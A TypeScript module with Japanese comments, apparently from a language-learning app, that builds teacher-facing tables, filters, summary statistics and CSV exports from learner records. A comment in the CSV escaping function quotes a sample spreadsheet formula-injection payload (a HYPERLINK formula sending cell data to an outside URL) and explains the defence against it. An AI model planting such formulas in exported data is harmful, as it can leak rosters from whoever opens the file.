/**
 * 学習の きろくを **1つの 表の かたち**に そろえる
 *
 * ## なぜ そろえるか
 * 記録は 5種類 ある（進み具合・もんだい・ことば・会話・リスニング）。種類ごとに
 * 絞り込みと 表と CSV を 書くと 同じ ものが 5つに 増え、**片方だけ 直る**
 *（学校で 絞れるのに 期生で 絞れない 表、CSV に 名前が 出ない 表）。
 * だから 中身を 先に `RecordRow` へ 落として、絞り込み・並べ・表示・CSV は 1本に する。
 *
 * ## 先頭の 5列は 種類が 変わっても 同じ
 * だれ（学生・所属）と どこ（ステージ・単元・種別）。先生は 表を 横に 読む ので、
 * 種類を 切り替えるたびに 列の 意味が 動くと 読めなく なる。
 *
 * ## 純関数に する
 * ブラウザが 無い ところでも 単体テストで 確かめられる ように、DB も 画面も 知らない。
 */

import type { ContentRefType } from "@/content/schema";
import { contentKindMeta } from "@/lib/content-kinds";
import type { ProfileRow } from "@/lib/profile-db";
import { formatSchool } from "@/lib/school";
import type { UnitRef } from "@/lib/records/units";
import type {
  ContentProgressRecord,
  ListeningRecord,
  MeetingRecord,
  QuizRecord,
  TalkRecord,
  WordAnswerRecord,
  WordTestRecord,
} from "@/lib/records/records-db";

export interface RecordColumn {
  readonly key: string;
  readonly label: string;
}

export interface RecordRow {
  /** だれの 記録か（メンバーでの 絞り込みに 使う）。 */
  readonly profileId: string;
  /** どの 教材の 記録か（ステージ・単元での 絞り込みに 使う）。 */
  readonly unitId: string;
  /** 並べ替えに 使う 時こく（ISO）。 */
  readonly at: string;
  readonly cells: Readonly<Record<string, string>>;
  /** つまずきを 数える ための 素の 値（無い 行は 数えない）。 */
  readonly stat?: RecordStat;
}

/**
 * つまずきを 数える ための **素の 値**。
 *
 * 画面に 出す 文字（"○" や "もう いちど"）から 数え直さない。表示は いつか 変わる もので、
 * 変えた 瞬間に 集計が 黙って 狂う——「○」を「できた」に 直した 日に 正答率が
 * 全部 0% に なる、という 壊れかたを する。
 */
export interface RecordStat {
  /** 何ごとに まとめるか（設問ID・語ID・教材ID）。 */
  readonly group: string;
  /** その まとまりの 見出し（先生が 読む 名前）。 */
  readonly groupLabel: string;
  /** 並べ替え用の 通し番号（Q1・Q2… の 順）。 */
  readonly order: number;
  /** できたか。`undefined` = 正誤の 無い 記録（進み具合・会話）。 */
  readonly ok?: boolean;
  /** 学習者が 書いた・打った もの（まちがいの 集計に 使う）。 */
  readonly answer?: string;
  /** 会話の 見かた（veryGood / good / miss）。 */
  readonly grade?: string;
  /** 言い直し（2回目 以降の 発話）か。 */
  readonly retried?: boolean;
  /** AIに 通せなかったか。 */
  readonly noAi?: boolean;
  /** おわった か（進み具合）。 */
  readonly done?: boolean;
  /** 平均を 出す 値（リスニングの 開いた％）。 */
  readonly value?: number;
}

export interface RecordTable {
  readonly columns: readonly RecordColumn[];
  readonly rows: readonly RecordRow[];
}

/** 記録の 種類（画面の タブ）。 */
export const RECORD_KINDS = [
  { id: "progress", icon: "📈", label: "進み具合" },
  { id: "quiz", icon: "✏️", label: "もんだいの こたえ" },
  { id: "word", icon: "🕹️", label: "ことばの テスト" },
  { id: "talk", icon: "💬", label: "会話" },
  { id: "listening", icon: "🎧", label: "リスニング" },
] as const;

export type RecordKind = (typeof RECORD_KINDS)[number]["id"];

/** どの 種類でも 先頭に 出る 5列。 */
const COMMON_COLUMNS: readonly RecordColumn[] = [
  { key: "student", label: "学生" },
  { key: "school", label: "所属" },
  { key: "stage", label: "ステージ" },
  { key: "unit", label: "単元" },
  { key: "type", label: "種別" },
];

/* ------------------------------------------------------------------ *
 * 引き当て
 * ------------------------------------------------------------------ */

export interface Lookups {
  readonly profiles: ReadonlyMap<string, ProfileRow>;
  readonly units: ReadonlyMap<string, UnitRef>;
  /** 問いの 文（鍵は `<教材id>:<問いid>`）。`loadUnitIndex` が 教材から 引いた もの。 */
  readonly prompts: Readonly<Record<string, string>>;
}

export function buildLookups(
  profiles: readonly ProfileRow[],
  units: readonly UnitRef[],
  prompts: Readonly<Record<string, string>> = {},
): Lookups {
  return {
    profiles: new Map(profiles.map((profile) => [profile.id, profile])),
    units: new Map(units.map((unit) => [unit.id, unit])),
    prompts,
  };
}

/**
 * 問いを **先生が 読める 一文**に する。
 *
 * 台帳が 持って いるのは id だけ（`q1-1`）で、それだけでは どんな 質問か 分からない
 *（2026-09-05 の 指定）。教材から 引いた 文が あれば それを 出し、無ければ id を 出す。
 *
 * **id を 落とさない のは 引けなかった ときだけ**。教材から 消した 問いでも
 * 「その問いに 何人が つまずいたか」は 数えられるので、行ごと 消して しまわない。
 */
function promptOf(lookups: Lookups, contentId: string, questionId: string): string {
  return lookups.prompts[`${contentId}:${questionId}`] || questionId;
}

/**
 * 先頭の 5列。
 *
 * **消えた 学生・消えた 教材も 行として 出す**（値は 空か id そのまま）。
 * 引けなかった 行を 落とすと、先生から見て 記録が 理由なく 減る——
 * 「無い」と「引けない」は 別物である。
 */
function commonCells(profileId: string, unitId: string, lookups: Lookups): Record<string, string> {
  const profile = lookups.profiles.get(profileId);
  const unit = lookups.units.get(unitId);
  return {
    student: profile?.display_name || profile?.email || "（消えた 学生）",
    school: profile ? formatSchool(profile) : "",
    stage: unit?.stageTitle ?? "",
    unit: unit?.title ?? unitId,
    type: unit ? contentKindMeta(unit.type as ContentRefType).label : "",
  };
}

/** 日時は 先生が 読む ので **秒まで 出さない**（表が 横に 伸びるだけ）。 */
export function formatAt(iso: string): string {
  if (!iso) return "";
  const at = new Date(iso);
  if (Number.isNaN(at.getTime())) return iso;
  const pad = (n: number) => String(n).padStart(2, "0");
  return `${at.getFullYear()}-${pad(at.getMonth() + 1)}-${pad(at.getDate())} ${pad(at.getHours())}:${pad(at.getMinutes())}`;
}

/* ------------------------------------------------------------------ *
 * 種類ごとの 組み立て
 * ------------------------------------------------------------------ */

export function progressTable(
  records: readonly ContentProgressRecord[],
  lookups: Lookups,
): RecordTable {
  return {
    columns: [
      ...COMMON_COLUMNS,
      { key: "status", label: "じょうたい" },
      { key: "position", label: "しおり" },
      { key: "completedAt", label: "おわった とき" },
      { key: "updatedAt", label: "さいごに 動いた とき" },
    ],
    rows: records.map((record) => ({
      profileId: record.profile_id,
      unitId: record.content_id,
      at: record.updated_at,
      stat: {
        group: record.content_id,
        groupLabel: lookups.units.get(record.content_id)?.title ?? record.content_id,
        order: lookups.units.get(record.content_id)?.order ?? 0,
        done: record.status === "completed",
      },
      cells: {
        ...commonCells(record.profile_id, record.content_id, lookups),
        status: record.status === "completed" ? "おわった" : "とちゅう",
        position: formatPosition(record.position),
        completedAt: formatAt(record.completed_at ?? ""),
        updatedAt: formatAt(record.updated_at),
      },
    })),
  };
}

/** しおりは 教材ごとに 形が ちがう。**そのまま 読める 形**にして 出す。 */
function formatPosition(position: Record<string, number> | null): string {
  if (!position) return "";
  const parts = Object.entries(position).map(([key, value]) => `${key}=${value}`);
  return parts.join(" ");
}

/**
 * 1回の 挑戦に **何回目か**を ふる。
 *
 * 「何回目」を 端末に 数えさせない（localStorage を 消した 学習者で 1に 戻り、嘘を つく）。
 * 人ごとに 古い順に 番号を ふるのが 正しい——これは 端末に 依存しない
 *（`@/lib/quiz/results-db` の `attemptsOf` と 同じ 数えかた）。
 */
function numberAttempts(
  records: readonly { profile_id: string; attempt_id: string; created_at: string }[],
): Map<string, number> {
  const firstAt = new Map<string, { profileId: string; at: string }>();
  for (const record of records) {
    const seen = firstAt.get(record.attempt_id);
    if (!seen || record.created_at < seen.at) {
      firstAt.set(record.attempt_id, { profileId: record.profile_id, at: record.created_at });
    }
  }
  const byProfile = new Map<string, { attemptId: string; at: string }[]>();
  for (const [attemptId, { profileId, at }] of firstAt) {
    const list = byProfile.get(profileId) ?? [];
    list.push({ attemptId, at });
    byProfile.set(profileId, list);
  }
  const nth = new Map<string, number>();
  for (const list of byProfile.values()) {
    list.sort((a, b) => a.at.localeCompare(b.at));
    list.forEach((one, index) => nth.set(one.attemptId, index + 1));
  }
  return nth;
}

const QUIZ_TYPE_LABEL: Record<string, string> = {
  choose: "4たく",
  multi: "ぜんぶ えらぶ",
  keyword: "じぶんで 書く",
  wordbank: "語群から あなうめ",
  emotion: "気もち → 言い方",
};

export function quizTable(records: readonly QuizRecord[], lookups: Lookups): RecordTable {
  const nth = numberAttempts(records);
  /* 1回の 挑戦の 合計点。**行ごとに 出す**——先生は「この回は 何点だったか」を
     行を 目で 足さずに 読みたい（畳む 前の テストの きろくが そうだった）。 */
  const attemptScore = new Map<string, { earned: number; points: number }>();
  for (const record of records) {
    const sum = attemptScore.get(record.attempt_id) ?? { earned: 0, points: 0 };
    attemptScore.set(record.attempt_id, {
      earned: sum.earned + record.earned,
      points: sum.points + record.max_points,
    });
  }

  return {
    columns: [
      ...COMMON_COLUMNS,
      { key: "question", label: "もんだい" },
      { key: "type", label: "かたち" },
      { key: "answer", label: "学生の こたえ" },
      { key: "correct", label: "正誤" },
      { key: "points", label: "点" },
      { key: "attemptScore", label: "その回の 点" },
      { key: "nth", label: "何回目" },
      { key: "fullSet", label: "まるごと" },
      { key: "at", label: "日時" },
    ],
    rows: records.map((record) => {
      const score = attemptScore.get(record.attempt_id);
      return {
        profileId: record.profile_id,
        unitId: record.quiz_set_id,
        at: record.created_at,
        stat: {
          group: record.question_id,
          groupLabel: `Q${record.question_index + 1} ${promptOf(lookups, record.quiz_set_id, record.question_id)}`,
          order: record.question_index,
          ok: record.correct,
          answer: record.answer_text,
        },
        cells: {
          ...commonCells(record.profile_id, record.quiz_set_id, lookups),
          // 何問目か ＋ **設問文そのもの**。id（`q1-1`）だけでは、先生が 教材を
          // 開かないと どんな 質問か 分からない（2026-09-05 の 指定）。
          question: `Q${record.question_index + 1} ${promptOf(lookups, record.quiz_set_id, record.question_id)}`,
          type: QUIZ_TYPE_LABEL[record.question_type] ?? record.question_type,
          // 空 = 何も 書かずに「こたえを 見る」を 押した。**そこで 詰まった 証拠**なので
          // 空欄の ままに せず、そう 書く。
          answer: record.answer_text === "" ? "（書いて いません）" : record.answer_text,
          correct: record.correct ? "○" : "×",
          points: `${record.earned}/${record.max_points}`,
          attemptScore: score ? `${score.earned}/${score.points}` : "",
          nth: `${nth.get(record.attempt_id) ?? 1}回目`,
          fullSet: record.full_set ? "まるごと" : "まちがえた ぶんだけ",
          at: formatAt(record.created_at),
        },
      };
    }),
  };
}

/**
 * ことばの テストは **1語 ＝ 1行**（明細）に して、その回の 点を 各行に 添える。
 *
 * 成績だけの 表と 明細の 表を 分けると、先生は 2つの 表を 突き合わせる ことに なる。
 * 知りたいのは いつも「この子は この語を どう 打ったか」なので、明細を 主に する。
 */
export function wordTable(
  answers: readonly WordAnswerRecord[],
  results: readonly WordTestRecord[],
  lookups: Lookups,
): RecordTable {
  const byAttempt = new Map(results.map((result) => [result.attempt_id, result]));
  return {
    columns: [
      ...COMMON_COLUMNS,
      { key: "word", label: "ことば" },
      { key: "reading", label: "正しい 読み" },
      { key: "readingInput", label: "学生が 打った 読み" },
      { key: "readingOk", label: "読み" },
      { key: "meaning", label: "正しい いみ" },
      { key: "meaningInput", label: "学生が えらんだ いみ" },
      { key: "meaningOk", label: "いみ" },
      { key: "mode", label: "遊びかた" },
      { key: "score", label: "その回の 点" },
      { key: "passed", label: "合否" },
      { key: "at", label: "日時" },
    ],
    rows: answers.map((answer) => {
      const result = byAttempt.get(answer.attempt_id);
      return {
        profileId: answer.profile_id,
        unitId: answer.stage_id,
        at: answer.created_at,
        stat: {
          group: answer.word_id,
          groupLabel: answer.term || answer.word_id,
          order: answer.word_index,
          // 読みを 聞いた 語は **読みも いみも 合って はじめて できた**。
          // いみだけの 遊びかた（readingOk が null）では いみだけで 数える。
          ok:
            answer.reading_ok === null ? answer.meaning_ok : answer.reading_ok && answer.meaning_ok,
          // まちがいの 集計に 出すのは **打った 読み**（いちばん 効く 手がかり）。
          answer: answer.reading_ok === false ? answer.reading_input : "",
        },
        cells: {
          ...commonCells(answer.profile_id, answer.stage_id, lookups),
          word: answer.term || answer.word_id,
          reading: answer.reading,
          // 空 = 一度も 打たなかった（時間切れ・いみだけの 遊びかた）。
          readingInput: answer.reading_input === "" ? "（打って いません）" : answer.reading_input,
          // null は「読みを 聞いて いない」。**0点 と 見分ける**ために 空欄に しない。
          readingOk: answer.reading_ok === null ? "—" : answer.reading_ok ? "○" : "×",
          meaning: answer.meaning,
          meaningInput: answer.meaning_input === "" ? "（時間ぎれ）" : answer.meaning_input,
          meaningOk: answer.meaning_ok ? "○" : "×",
          mode: modeLabel(result?.mode ?? ""),
          score: result ? `${result.score}/${result.max_score}` : "",
          // 合否を 名乗れるのは 本番だけ。れんしゅうの 行に「不合格」と 出さない。
          passed: result
            ? result.mode !== "test"
              ? "—"
              : result.passed
                ? "合格"
                : "もう いちど"
            : "",
          at: formatAt(answer.created_at),
        },
      };
    }),
  };
}

function modeLabel(mode: string): string {
  if (mode === "test") return "テスト";
  if (mode === "practice") return "れんしゅう";
  if (mode === "quiz") return "いみだけ";
  return mode;
}

const GRADE_LABEL: Record<string, string> = {
  veryGood: "すばらしい",
  good: "つたわった",
  miss: "もう いちど",
};

/**
 * 会話は **ミーティングと たいわ を 1つの 表**に する。
 *
 * 別々に すると、先生は「この子は 話せて いるか」を 2つの 画面を 行き来して 見る
 * ことに なる。形は ちがうが（たいわ は 相手の 返事も 残る）、聞きたい ことは 同じ。
 * ちがう ところは `kind` と `note` の 列に 逃がす。
 */
export function talkTable(
  meetings: readonly MeetingRecord[],
  talks: readonly TalkRecord[],
  lookups: Lookups,
): RecordTable {
  const rows: RecordRow[] = [
    ...meetings.map((record) => ({
      profileId: record.profile_id,
      unitId: record.meeting_id,
      at: record.created_at,
      stat: {
        group: record.question_id,
        groupLabel: promptOf(lookups, record.meeting_id, record.question_id),
        order: 0,
        grade: record.grade ?? "",
        // 2回目 以降の 発話 = 言い直し。効いたかを 数える。
        retried: record.attempt > 1,
        noAi: Boolean(record.fallback) && record.fallback !== "none",
      },
      cells: {
        ...commonCells(record.profile_id, record.meeting_id, lookups),
        kind: "ミーティング",
        speaker: "学生",
        // ヘンディさんが 何を 聞いたか。id では 中身が 見えない。
        topic: promptOf(lookups, record.meeting_id, record.question_id),
        body: record.utterance,
        way: record.mode === "voice" ? "こえ" : "もじ",
        note:
          (record.grade ? (GRADE_LABEL[record.grade] ?? record.grade) : "") +
          // AIに 通せなかった 回は そう 書く。見かたが 空なのと 「AIなし」は 別物。
          (record.fallback && record.fallback !== "none" ? `（AIなし: ${record.fallback}）` : ""),
        /*
         * AIの 見かたの 中身。**`grade` だけでは「もう いちど と 言われた」ことしか
         * 分からず、何を どう 直せば よかったかが 見えない**（畳む 前の
         * ミーティングの きろくは ここまで 開いて いた）。
         * 軸（ことば・かみ合い・かたち）は **持って いる 行にだけ** 出す——
         * 松井社長との 会話は 三段の 評価では ないので この 4つを 持たない。
         */
        reply: record.judge?.reply ?? "",
        praise: record.judge?.praise ?? "",
        fix: record.judge?.fix ?? "",
        example: record.judge?.exampleAnswer ?? "",
        axes: record.judge?.language
          ? `ことば: ${record.judge.language} / かみ合い: ${record.judge.relevance} / かたち: ${record.judge.form}` +
            ((record.judge.glossary?.length ?? 0) > 0
              ? ` / 語釈: ${(record.judge.glossary ?? []).map((one) => one.term).join("、")}`
              : "")
          : "",
        attempt: `${record.attempt}回目`,
        at: formatAt(record.created_at),
      },
    })),
    ...talks.map((record) => ({
      profileId: record.profile_id,
      unitId: record.talk_id,
      at: record.created_at,
      /*
       * たいわ には `stat` を 付けない ＝ **つまずきの まとめには 出ない**。
       *
       * まとめの 列は 三段の 評価（すばらしい／つたわった／もう いちど）で、
       * たいわ の 会話は そもそも それで 進まない——聞き出せたか どうかだけである。
       * ここで 「聞き出せた＝すばらしい」と 読み替えると、まとめの 数字は
       * **全部 すばらしい**に なり、先生は それを 三段の 評価として 読む。
       * 数えられない ものを 数えた ことに するのが いちばん 悪い
       *（`@/lib/meeting/log` の `MeetingTurnJudge` と 同じ 判断）。
       * たいわ の 手ごたえは 明細の「見かた」列（`N/M 聞き出せた`）で 読む。
       */
      cells: {
        ...commonCells(record.profile_id, record.talk_id, lookups),
        kind: "たいわ",
        speaker: record.speaker === "learner" ? "学生" : "あいて",
        // 要件ボードの 見出し（`r3` では なく「よさん」）。
        topic:
          record.opened_req_id === ""
            ? ""
            : `聞き出せた: ${promptOf(lookups, record.talk_id, record.opened_req_id)}`,
        body: record.body,
        way: record.mode === "voice" ? "こえ" : "もじ",
        note: `${record.opened_count}/${record.req_total} 聞き出せた`,
        attempt: `${record.turn_index + 1}番目`,
        at: formatAt(record.created_at),
      },
    })),
  ];
  return {
    columns: [
      ...COMMON_COLUMNS,
      { key: "kind", label: "しゅるい" },
      { key: "speaker", label: "話し手" },
      { key: "body", label: "話した こと" },
      { key: "topic", label: "しつもん／聞き出せた こと" },
      { key: "way", label: "やりかた" },
      { key: "note", label: "見かた" },
      { key: "reply", label: "あいての 返事" },
      { key: "praise", label: "ほめた ところ" },
      { key: "fix", label: "直す ところ" },
      { key: "example", label: "お手本" },
      { key: "axes", label: "見かたの ないわけ" },
      { key: "attempt", label: "何回目" },
      { key: "at", label: "日時" },
    ],
    rows,
  };
}

export function listeningTable(records: readonly ListeningRecord[], lookups: Lookups): RecordTable {
  return {
    columns: [
      ...COMMON_COLUMNS,
      { key: "inputs", label: "学生が 当てた ことば" },
      { key: "found", label: "いくつ" },
      { key: "reveal", label: "原稿が 開いた %" },
      { key: "left", label: "のこりの キーワード" },
      { key: "updatedAt", label: "さいごに 動いた とき" },
    ],
    rows: records.map((record) => ({
      profileId: record.profile_id,
      unitId: record.listening_id,
      at: record.updated_at,
      stat: {
        group: record.listening_id,
        groupLabel: lookups.units.get(record.listening_id)?.title ?? record.listening_id,
        order: lookups.units.get(record.listening_id)?.order ?? 0,
        value: record.reveal_percent,
      },
      cells: {
        ...commonCells(record.profile_id, record.listening_id, lookups),
        inputs: (record.inputs ?? []).join(" / "),
        found: String((record.inputs ?? []).length),
        reveal: `${record.reveal_percent}%`,
        left: String(record.keywords_left),
        updatedAt: formatAt(record.updated_at),
      },
    })),
  };
}

/* ------------------------------------------------------------------ *
 * つまずき（まとめ）
 *
 * 畳む 前の `/admin/meetings`・`/admin/quizzes` が **いちばん 上に 置いて いた**もの。
 * 先生が まず 知りたいのは 誰が できなかったかでは なく **どこで 止まるか**である
 *（1つだけ 低いなら、疑うのは 学生では なく その 設問の 作りか 前の 教材の 説明）。
 * 直す順が 一覧を 上から 読むだけで 分かる ように **わるい順**に 並べる。
 *
 * 畳んだ ぶん **良く なった ところ**が 2つ ある。
 *   1. 絞り込み（所属・期生・メンバー・ステージ）が そのまま 効く。前は 全員ぶんの
 *      集計しか 出せず、「CADT の 2期生だけ」は 数えられなかった。
 *   2. CSV に 出せる。前の 2画面の 集計は 画面の 中だけだった。
 * ------------------------------------------------------------------ */

/** その まとまりに 集まった 行。 */
interface Bucket {
  readonly label: string;
  readonly order: number;
  readonly rows: RecordRow[];
}

function bucketize(rows: readonly RecordRow[], keep: (stat: RecordStat) => boolean): Bucket[] {
  const map = new Map<string, Bucket & { rows: RecordRow[] }>();
  for (const row of rows) {
    if (!row.stat || !keep(row.stat)) continue;
    const found = map.get(row.stat.group);
    if (found) found.rows.push(row);
    else
      map.set(row.stat.group, {
        label: row.stat.groupLabel,
        order: row.stat.order,
        rows: [row],
      });
  }
  return [...map.values()];
}

function percent(part: number, whole: number): string {
  return whole === 0 ? "—" : `${Math.round((part / whole) * 100)}%`;
}

/** まちがえた こたえを 多い順に（上位8つ）。書き方の ゆれ・まぎらわしい 選択肢が ここで 出る。 */
function missedAnswers(rows: readonly RecordRow[]): string {
  const count = new Map<string, number>();
  for (const row of rows) {
    if (!row.stat || row.stat.ok !== false) continue;
    const answer = row.stat.answer ?? "";
    const key = answer === "" ? "（書いて いません）" : answer;
    count.set(key, (count.get(key) ?? 0) + 1);
  }
  return [...count.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, 8)
    .map(([answer, n]) => `${answer}（${n}）`)
    .join(" / ");
}

/**
 * いま 見て いる 行から「つまずき」を 数える。
 *
 * **絞り込んだ あとの 行**を 受ける（引数が `RecordRow[]`）ので、集計も 絞り込みに
 * 従う。数えるのは 表示の 文字では なく `stat`（素の 値）——表示を 直した 日に
 * 集計が 黙って 狂うのを 避ける。
 *
 * 数える ものが 無ければ null（画面は 何も 出さない）。
 */
export function summaryTable(kind: RecordKind, rows: readonly RecordRow[]): RecordTable | null {
  const cell = (values: Record<string, string>): RecordRow => ({
    profileId: "",
    unitId: "",
    at: "",
    cells: values,
  });

  if (kind === "quiz" || kind === "word") {
    const buckets = bucketize(rows, (stat) => stat.ok !== undefined);
    if (buckets.length === 0) return null;
    const isQuiz = kind === "quiz";
    return {
      columns: [
        { key: "group", label: isQuiz ? "もんだい" : "ことば" },
        { key: "answered", label: "こたえた" },
        { key: "correct", label: "できた" },
        { key: "rate", label: isQuiz ? "正答率" : "できた率" },
        { key: "people", label: "人数" },
        { key: "misses", label: isQuiz ? "まちがえた こたえ（多い順）" : "まちがえた 打ちかた" },
      ],
      // わるい順（同率なら 教材の 出題順）。上から 読むだけで 直す順が 分かる。
      rows: buckets
        .map((bucket) => {
          const answered = bucket.rows.length;
          const correct = bucket.rows.filter((row) => row.stat?.ok === true).length;
          return {
            rate: answered === 0 ? 0 : correct / answered,
            order: bucket.order,
            row: cell({
              group: bucket.label,
              answered: String(answered),
              correct: String(correct),
              rate: percent(correct, answered),
              people: String(new Set(bucket.rows.map((row) => row.profileId)).size),
              misses: missedAnswers(bucket.rows),
            }),
          };
        })
        .sort((a, b) => a.rate - b.rate || a.order - b.order)
        .map((one) => one.row),
    };
  }

  if (kind === "talk") {
    const buckets = bucketize(rows, (stat) => stat.grade !== undefined && stat.grade !== "");
    if (buckets.length === 0) return null;
    return {
      columns: [
        { key: "group", label: "しつもん／聞き出せた こと" },
        { key: "turns", label: "はなした 回数" },
        { key: "veryGood", label: "すばらしい" },
        { key: "good", label: "つたわった" },
        { key: "miss", label: "もう いちど" },
        { key: "retried", label: "言い直し" },
        { key: "noAi", label: "AIなし" },
        { key: "people", label: "人数" },
      ],
      // 「もう いちど」が 多い順。高い しつもんは、学生では なく ヒントの 作りを 疑う。
      rows: buckets
        .map((bucket) => {
          const count = (grade: string) =>
            bucket.rows.filter((row) => row.stat?.grade === grade).length;
          return {
            miss: count("miss"),
            row: cell({
              group: bucket.label,
              turns: String(bucket.rows.length),
              veryGood: String(count("veryGood")),
              good: String(count("good")),
              miss: String(count("miss")),
              retried: String(bucket.rows.filter((row) => row.stat?.retried).length),
              noAi: String(bucket.rows.filter((row) => row.stat?.noAi).length),
              people: String(new Set(bucket.rows.map((row) => row.profileId)).size),
            }),
          };
        })
        .sort((a, b) => b.miss - a.miss)
        .map((one) => one.row),
    };
  }

  if (kind === "progress") {
    const buckets = bucketize(rows, (stat) => stat.done !== undefined);
    if (buckets.length === 0) return null;
    return {
      columns: [
        { key: "group", label: "単元" },
        { key: "opened", label: "開いた 人" },
        { key: "done", label: "おわった 人" },
        { key: "rate", label: "おわった 率" },
      ],
      // 低い順。**まだ 誰も 終えて いない 教材**が いちばん 上に 来る。
      rows: buckets
        .map((bucket) => {
          const opened = new Set(bucket.rows.map((row) => row.profileId)).size;
          const done = new Set(
            bucket.rows.filter((row) => row.stat?.done).map((row) => row.profileId),
          ).size;
          return {
            rate: opened === 0 ? 0 : done / opened,
            order: bucket.order,
            row: cell({
              group: bucket.label,
              opened: String(opened),
              done: String(done),
              rate: percent(done, opened),
            }),
          };
        })
        .sort((a, b) => a.rate - b.rate || a.order - b.order)
        .map((one) => one.row),
    };
  }

  const buckets = bucketize(rows, (stat) => stat.value !== undefined);
  if (buckets.length === 0) return null;
  return {
    columns: [
      { key: "group", label: "単元" },
      { key: "people", label: "やった 人" },
      { key: "average", label: "へいきん 開いた％" },
      { key: "lowest", label: "いちばん ひくい 人" },
    ],
    // 開けて いない 順。原稿が 開かない 教材は、音か キーワードの 作りを 疑う。
    rows: buckets
      .map((bucket) => {
        const values = bucket.rows.map((row) => row.stat?.value ?? 0);
        const average = values.reduce((sum, one) => sum + one, 0) / values.length;
        return {
          average,
          order: bucket.order,
          row: cell({
            group: bucket.label,
            people: String(new Set(bucket.rows.map((row) => row.profileId)).size),
            average: `${Math.round(average)}%`,
            lowest: `${Math.min(...values)}%`,
          }),
        };
      })
      .sort((a, b) => a.average - b.average || a.order - b.order)
      .map((one) => one.row),
  };
}

/* ------------------------------------------------------------------ *
 * 絞り込みと 並べ
 * ------------------------------------------------------------------ */

export interface RecordFilter {
  /** "" = ぜんぶ。 */
  readonly university: string;
  /** 0 = ぜんぶ。-1 = 未設定の 人だけ。 */
  readonly cohort: number;
  /** "" = ぜんぶ。 */
  readonly profileId: string;
  /** "" = ぜんぶ。 */
  readonly stageId: string;
  /** "" = ぜんぶ。 */
  readonly unitId: string;
  /** 学生の 名前・こたえの 中の ことば（空 = 絞らない）。 */
  readonly text: string;
}

export const EMPTY_FILTER: RecordFilter = {
  university: "",
  cohort: 0,
  profileId: "",
  stageId: "",
  unitId: "",
  text: "",
};

/** 絞り込みに 通る 学生か。 */
export function matchesProfile(profile: ProfileRow | undefined, filter: RecordFilter): boolean {
  if (filter.profileId !== "" && profile?.id !== filter.profileId) return false;
  if (filter.university !== "" && profile?.university !== filter.university) return false;
  if (filter.cohort > 0 && profile?.cohort !== filter.cohort) return false;
  // 「未設定」は 0 の 人（この列を 足す 前の 行）。**探せる ように する**——
  // 未設定の ままの 学生は、先生が 声を かける 相手である。
  if (filter.cohort === -1 && (profile?.cohort ?? 0) !== 0) return false;
  return true;
}

export function filterRows(
  table: RecordTable,
  filter: RecordFilter,
  lookups: Lookups,
): readonly RecordRow[] {
  const needle = filter.text.trim().toLowerCase();
  return (
    table.rows
      .filter((row) => {
        if (!matchesProfile(lookups.profiles.get(row.profileId), filter)) return false;
        if (filter.unitId !== "" && row.unitId !== filter.unitId) return false;
        if (filter.stageId !== "") {
          const unit = lookups.units.get(row.unitId);
          if ((unit?.stageId ?? "") !== filter.stageId) return false;
        }
        if (needle !== "") {
          const haystack = Object.values(row.cells).join(" ").toLowerCase();
          if (!haystack.includes(needle)) return false;
        }
        return true;
      })
      /*
       * 新しい ものが 上。先生が 開くのは たいてい **授業の 直後**で、見たいのは
       * さっきの 1コマである。古い順に すると、毎回 いちばん 下まで 送る ことに なる。
       */
      .toSorted((a, b) => b.at.localeCompare(a.at))
  );
}

/* ------------------------------------------------------------------ *
 * CSV
 * ------------------------------------------------------------------ */

/**
 * CSV の 1マス。
 *
 * ## 引用符・改行の 逃がしだけでは 足りない
 * この 表に 入るのは **学習者が 打った 生の 文**（たいわの 発話・もんだいの こたえ・
 * 打った 読み・当てた ことば）である。Excel と Google スプレッドシートは
 * `=` `+` `-` `@` タブ・復帰 で 始まる マスを **数式**として 読むので、
 * 学習者が こたえ欄に `=HYPERLINK("http://…"&A2,"OK")` と 書けば、
 * それを 開いた **先生の 端末で** 名簿ごと 外へ 運べる 形に なる。
 * 先頭に `'` を 足して、数式では なく 文字として 読ませる。
 *
 * ここは 2026-09-04 に **はじめて「学習者が 書いた 文字列を 先生の Excel に 渡す」道**
 * が できた ところなので、その 道と 一緒に 蓋を する。
 */
function escapeCsv(value: string): string {
  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return /[",\r\n]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}

/**
 * 表の 見えて いる ぶんを そのまま CSV に する。
 *
 * 先頭に BOM を 付けるのは Excel が UTF-8 と 読み違えない ため
 *（`buildPersonalityCsv` と 同じ）。改行は CRLF。
 */
export function buildRecordsCsv(
  columns: readonly RecordColumn[],
  rows: readonly RecordRow[],
): string {
  const header = columns.map((column) => escapeCsv(column.label));
  const body = rows.map((row) => columns.map((column) => escapeCsv(row.cells[column.key] ?? "")));
  return `${"\uFEFF"}${[header, ...body].map((line) => line.join(",")).join("\r\n")}`;
}
